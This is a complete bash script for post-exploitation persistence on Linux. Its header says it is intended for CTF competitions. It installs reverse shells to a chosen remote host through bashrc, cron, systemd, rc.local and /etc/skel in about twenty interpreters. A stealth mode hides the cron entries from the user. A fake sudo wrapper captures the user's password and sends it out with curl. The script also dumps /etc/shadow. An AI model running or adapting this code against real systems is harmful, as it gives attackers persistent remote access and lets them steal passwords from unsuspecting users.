#!/bin/bash

CLEAN=0
CLEANCRONTMP=$(mktemp)
CLEANSYSMSG=0
CRON="* * * * *"
DISABLEBASHRC=0
DRYRUN=0
EZID=$(mktemp -d)
JJSFILE=$(mktemp)
PASSWDFILE=$(mktemp)
PAYLOADFILE=$(mktemp)
PERMACRON=$(mktemp)
PIPTMPDIR=$(mktemp -d)
PIP3TMPDIR=$(mktemp -d)
RANDOMPORT=$(expr 1024 + $RANDOM)
SHELL="/bin/bash"
STEALTHMODE=0
TMPCLEANBASHRC=$(mktemp)
TMPCLEANRCLOCAL=$(mktemp)
TMPCRON=$(mktemp)
TMPRCLOCAL=$(mktemp)
TMPSERVICE=$(mktemp -u | sed 's/.*\.//g').service
TMPSERVICESHELLSCRIPT=$(mktemp -u | sed 's/.*\.//g').sh
VALIDSYNTAX=0

INFO="Automatically install multiple methods of persistence\n\nAdvisory: This was developed with CTFs in mind and that is its intended use case. The stealth-mode option is for King of the Hill style competitions where others might try and tamper with your persistence. Please do not use this tool in an unethical or illegal manner.\n"
HELP="
\e[33m -h, --help\e[0m show this message\n
\e[33m-d, --dryrun\e[0m dry run, do not install persistence, just enumerate\n
\e[33m-i, --rhost\e[0m IP/domain to call back to\n
\e[33m-p, --rport\e[0m port to call back to\n
\e[33m--cron\e[0m cron schedule for any reverse shells executed by crontab (default: every minute)\n
\e[33m-c, --clean\e[0m removes any reverse shells installed by this program for the given RHOST\n
\e[33m-s, --stealth-mode\e[0m various trivial modifications to the install function in an attempt to hide the backdoors from humans - see documentation"

while test $# -gt 0;
do
	case "$1" in
		-h|--help)
			echo -e $INFO
			echo -e $HELP
			exit ;;
		-d|--dryrun)
			shift
			DRYRUN=1 ;;
		--cron)
			shift
			export CRON=$1
			shift ;;
		-s|--stealth-mode)
			shift
			STEALTHMODE=1 ;;
		-i|--rhost)
			shift
			if test $# -gt 0;
			then
				export RHOST=$1
			fi
			shift ;;
		-p|--rport)
			shift
			if test $# -gt 0;
			then
				export RPORT=$1
			fi
			shift ;;
		-c|--clean)
			CLEAN=1
			shift ;;
	esac
done

if [ "$CLEAN" -eq 1 ];
then
	if $(echo $RHOST | grep -qi "[A-Za-z0-9]");
	then
		VALIDSYNTAX=1
	else
		echo -e $INFO
		echo -e $HELP
		exit
	fi
fi

if [ "$VALIDSYNTAX" -eq 0 ];
then
	if [ "$DRYRUN" -eq 0 ];
	then
		if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
		then
			if [ "$STEALTHMODE" -eq 1 ];
			then
				DISABLEBASHRC=1
				TMPSERVICE=.$(mktemp -u | sed 's/.*\.//g').service
				TMPSERVICESHELLSCRIPT=.$(mktemp -u | sed 's/.*\.//g').sh
				
				echo 'function crontab () {
				REALBIN="$(which crontab)"
				if $(echo "$1" | grep -qi "\-l");
				then
					if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
				elif $(echo "$1 | grep -qi "\-r);
				then
					if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
				else
					$REALBIN "${@:1}"
				fi
				}' >> ~/.bashrc
			fi
		else
			echo -e $INFO
			echo -e $HELP
			exit
		fi
	else
		if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
		then
			echo -e $INFO
			echo -e $HELP
			exit
		fi
	fi
fi

METHODS=(
	"bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
	"easy_install , echo 'import sys,socket,os,pty;exit()' > $EZID/setup.py; easy_install $EZID 2> /dev/null &> /dev/null , echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $EZID/setup.py; easy_install $EZID?"
	"gdb , gdb -nx -ex 'python import sys,socket,os,pty;exit()' &> /dev/null , echo 'c' | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' -ex quit &> /dev/null?"
	"irb , echo \\\"require 'socket'\\\" | irb --noecho --noverbose , echo \\\"require 'socket'; exit if fork;c=TCPSocket.new('$RHOST',$RPORT);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read} end\\\" | irb --noecho --noverbose?"
	"jrunscript , jrunscript -e 'exit();' , jrunscript -e 'var host=\\\"$RHOST\\\"; var port=$RPORT;var p=new java.lang.ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'?"
	"jjs , echo \"quit()\" > $JJSFILE; jjs $JJSFILE , echo 'var ProcessBuilder = Java.type(\\\"java.lang.ProcessBuilder\\\");var p=new ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var Socket = Java.type(\\\"java.net.Socket\\\");var s=new Socket(\\\"$RHOST\\\",$RPORT);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\\\"java.lang.Thread\\\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs?" 
	"ksh , ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
	"nc , nc -w 1 -lnvp $RANDOMPORT &> /dev/null & nc 0.0.0.0 $RANDOMPORT &> /dev/null , nc $RHOST $RPORT -e $SHELL?"
	"node , node -e \"process.exit(0)\" , node -e \\\"sh = require(\\\\\\\"child_process\\\\\\\").spawn(\\\\\\\"$SHELL\\\\\\\");net.connect($RPORT, \\\\\\\"$RHOST\\\\\\\", function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});\\\"?"
	"perl , perl -e \"use Socket;\" , perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($RPORT,inet_aton(\\\"$RHOST\\\")))){open(STDIN,\\\"\>\&S\\\");open(STDOUT,\\\"\>\&S\\\");open(STDERR,\\\"\>\&S\\\");exec(\\\"$SHELL -i\\\");};'?"
	"php , php -r 'exit();' , php -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\"?"
	"php7.4 , php7.4 -r 'exit();' , php7.4 -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\"?"
	"pwsh , pwsh -command 'exit' , pwsh -command '\\\$client = New-Object System.Net.Sockets.TCPClient(\\\"$RHOST\\\",$RPORT);\\\$stream = \\\$client.GetStream();[byte[]]\\\$bytes = 0..65535|%{0};while((\\\$i = \\\$stream.Read(\\\$bytes, 0, \\\$bytes.Length)) -ne 0){;\\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$bytes,0, \\\$i);\\\$sendback = (iex \\\$data 2>&1 | Out-String );\\\$sendback2 = \\\$sendback + \\\"# \\\";\\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()'?"
	"pip , echo 'import socket,subprocess,os;exit()' > $PIPTMPDIR/setup.py; pip install $PIPTMPDIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $PIPTMPDIR/setup.py; pip install $PIPTMPDIR?"
	"pip3 , echo 'import socket,subprocess,os;exit()' > $PIP3TMPDIR/setup.py; pip3 install $PIP3TMPDIR 2>&1 | grep -qi 'ERROR: No .egg-info directory found in' , echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $PIP3TMPDIR/setup.py; pip3 install $PIP3TMPDIR?"
	"python , python -c 'import socket,subprocess,os;exit()' , python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python2 , python2 -c 'import socket,subprocess,os;exit()' , python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python2.7 , python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python3 , python3 -c 'import socket,subprocess,os;exit()' , python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"python3.8 , python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
	"ruby , ruby -rsocket -e 'exit' , ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"'$RHOST'\\\",'$RPORT');while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'?"
	"socat , socat tcp-listen:$RANDOMPORT STDOUT & echo exit | socat -t 1 STDIN tcp-connect:0.0.0.0:$RANDOMPORT , socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane?"
	"telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(mktemp -u);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
)

enum_methods() {

	IFS="?"
	for s in ${METHODS[@]};
	do
		METHOD=$(echo $s | awk -F ' , ' '{print $1}')
		EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
		PAYLOAD=$(echo $s | awk -F ' , ' '{print $3}')
		if $(echo $METHOD | grep -qi "[a-z]")
		then
			echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null 1>&2
			if [ $? -eq 0 ];
			then
				echo -e "\e[92m[+]\e[0m Method Found: $METHOD"
				enum_doors $METHOD $PAYLOAD
			fi
		fi
	done

}

enum_doors() {

	DOORS=(
		"bashrc , touch ~/.bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> ~/.bashrc?"
		"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON && rm $PERMACRON?"
		"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$TMPSERVICESHELLSCRIPT; if test -f /etc/systemd/system/$TMPSERVICE; then echo > /dev/null; else touch /etc/systemd/system/$TMPSERVICE; echo \"[Service]\" >> /etc/systemd/system/$TMPSERVICE; echo \"Type=oneshot\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$TMPSERVICESHELLSCRIPT\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$TMPSERVICE; echo \"[Install]\" >> /etc/systemd/system/$TMPSERVICE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$TMPSERVICE; chmod 644 /etc/systemd/system/$TMPSERVICE; systemctl start $TMPSERVICE 2> /dev/null & sleep .0001; systemctl enable $TMPSERVICE 2> /dev/null & sleep .0001; fi;?"
		"/etc/rc.local , uname -a | grep -q -e Linux -e OpenBSD && find /etc/ -writable -type f 2> /dev/null | grep -q etc , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
		"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
	)

	IFS="?"
	for s in ${DOORS[@]};
	do
		if $(echo $PAYLOAD | grep -qi "[a-z]")
		then
			DOOR=$(echo $s | awk -F ' , ' '{print $1}')
			EVAL_STATEMENT=$(echo $s | awk -F ' , ' '{print $2}')
			HINGE=$(echo $s | awk -F ' , ' '{print $3}')
			if $(echo $DOOR | grep -qi "[a-z]")
			then
				echo "$EVAL_STATEMENT" | $SHELL 2> /dev/null
				if [ $? -eq 0 ];
				then
					if echo $DOOR | grep -qi "[a-z]";
					then
						if [ $DISABLEBASHRC -eq 1 ] && $(echo $DOOR | grep -qi bashrc);
						then
							:
						else
							echo "[+] Door Found: $DOOR"
							if [ "$DRYRUN" -eq 0 ];
							then
								echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null && echo " - Persistence Installed: $METHOD using $DOOR"
							fi
						fi
					fi
				fi
			fi
		fi
	done
	echo "-----------------------"

}

sudo_hijack_attack() {

	if $(cat /etc/group | grep sudo | grep -qi $(whoami)) && $(which curl | grep -qi curl);
	then
		if [ "$DRYRUN" -eq 0 ];
		then
			echo 'function sudo () {
			REALSUDO="$(which sudo)"
			PASSWDFILE="'$PASSWDFILE'"
			read -s -p "[sudo] password for $USER: " PASSWD
			printf "\n"; printf "%s\n" "$USER : $PASSWD" >> $PASSWDFILE
			sort -uo "$PASSWDFILE" "$PASSWDFILE"
			ENCODED=$(cat "$PASSWDFILE" | base64) > /dev/null 2>&1
			curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1
			$REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1
			$REALSUDO "${@:1}"
			}' >> ~/.bashrc
			echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
			echo "[+] Password will be Stored in $PASSWDFILE"
			echo "[+] $PASSWDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
		else
			echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
		fi
		echo "-----------------------"
	fi

}

webserver_poison_attack() {

	unset IFS

	if $(grep -qi "www-data" /etc/passwd)
	then
		if $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d 2> /dev/null | grep -qi "[A-Za-z0-9]")
		then
			echo -e "\e[92m[+]\e[0m Web Server Poison Attack Available for the Following Directories"
			for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type d);
			do
				echo "[+] $i"
			done
			echo "-----------------------"
		fi
	fi

}

shadow() {

	if $(find /etc/shadow -readable | grep -qi shadow)
	then
		if [ "$DRYRUN" -eq 0 ];
		then
			echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
			egrep -v "\*|\!" /etc/shadow
		else
			echo -e "\e[92m[+]\e[0m You Can Read /etc/shadow"
		fi
		echo "-----------------------"
	fi

}

cleanup() {

	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function crontab" ~/.bashrc) && $(grep -qi REALBIN ~/.bashrc);
	then
		cat ~/.bashrc | sed '1,/function crontab/!d' | grep -v "function crontab" > $TMPCLEANBASHRC
		cp $TMPCLEANBASHRC ~/.bashrc
		echo -e "\e[92m[+]\e[0m Removed crontab function from bashrc"
	fi

	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function sudo" ~/.bashrc) && $(grep -qi REALSUDO ~/.bashrc) && $(grep -qi PASSWDFILE ~/.bashrc);
	then
		cat ~/.bashrc | sed '1,/function sudo/!d' | grep -v "function sudo" > $TMPCLEANBASHRC
		cp $TMPCLEANBASHRC ~/.bashrc
		echo -e "\e[92m[+]\e[0m Removed sudo function from bashrc"
	fi

	if $(cat ~/.bashrc | grep -q $1);
	then
		grep --color=never -v $1 ~/.bashrc > $TMPCLEANBASHRC
		cp $TMPCLEANBASHRC ~/.bashrc
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from ~/.bashrc"
	fi

	CRONBINARY=$(which crontab)
	if $($CRONBINARY -l 2> /dev/null | grep -q $1);
	then
		$CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from crontab"
	fi

	for i in $(find /etc/systemd/ -writable -type f 2> /dev/null);
	do
		grep -q $1 $i 2> /dev/null
		if [[ $? -eq 0 ]];
		then
			TMP=$(echo $i | sed 's/.*\///g' | tr -d '.' | sed 's/..$//g')
			for j in $(find /etc/systemd/ -writable -type f);
			do
				grep -q $TMP $j 2> /dev/null
				if [[ $? -eq 0 ]];
				then
					srm $i $j 2> /dev/null || rm $i $j
					CLEANSYSMSG=1
				fi
			done
		fi
	done

	if [ "$CLEANSYSMSG" -eq 1 ];
	then
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from systemctl"
	fi

	if $(cat /etc/rc.local 2> /dev/null | grep -q $1);
	then
		grep --color=never -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL
		cp $TMPCLEANRCLOCAL "/etc/rc.local"
		if $(cat /etc/rc.local | wc -l | grep -q "^2$");
		then
			rm "/etc/rc.local"
		fi
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/rc.local"
	fi

	if $(cat /etc/skel/.bashrc 2> /dev/null | grep -q $1);
	then
		grep --color=never -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC
		cp $TMPCLEANBASHRC /etc/skel/.bashrc
		echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
	fi
	
}

main() {
	
	if [ "$CLEAN" -eq 1 ];
	then
		cleanup $RHOST
		exit
	fi
	enum_methods
	sudo_hijack_attack $PASSWDFILE
	webserver_poison_attack
	shadow

}

main
